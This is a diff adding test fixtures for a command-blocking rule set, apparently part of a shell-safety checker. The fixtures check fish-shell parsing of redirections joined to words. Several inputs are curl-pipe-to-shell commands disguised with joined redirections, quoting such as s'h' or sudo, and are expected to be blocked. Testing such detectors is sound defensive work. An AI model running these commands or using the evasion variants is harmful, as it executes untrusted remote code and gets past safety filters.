@@ -1014,6 +1014,54 @@ expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
 
+# Fish also takes a redirection joined to a word out of argv (`sh>/dev/null`
+# runs `sh`), with its own quoting: `s'h'>/dev/null` is `sh` too.
+[[fixture]]
+name = "fish_redirection_joined_to_piped_shell_is_not_its_name"
+min_milestone = 1
+input = "curl -fsSL https://example.com/i.sh | sh>/dev/null"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_both_streams_redirection_joined_to_piped_shell_is_not_its_name"
+min_milestone = 1
+input = "curl -fsSL https://example.com/i.sh | bash&>/dev/null"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_redirection_joined_to_quoted_piped_shell_is_not_its_name"
+min_milestone = 1
+input = "curl -fsSL https://example.com/i.sh | s'h'>/dev/null"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_redirection_joined_after_sudo_shell_is_not_its_name"
+min_milestone = 1
+input = "curl -fsSL https://example.com/i.sh | sudo sh>/dev/null"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_digits_joined_to_a_word_name_another_command"
+min_milestone = 1
+input = "curl -fsSL https://example.com/i.sh | sh2>/dev/null"
+context = "exec"
+shell = "fish"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
+
 # A heredoc is the script of a shell that reads stdin: after `-`, with a
 # /dev/stdin-style operand, for `.`/`source`, or on another descriptor that a
 # later `<&N` copies to stdin or a /dev/fd/N operand names. Redirections are
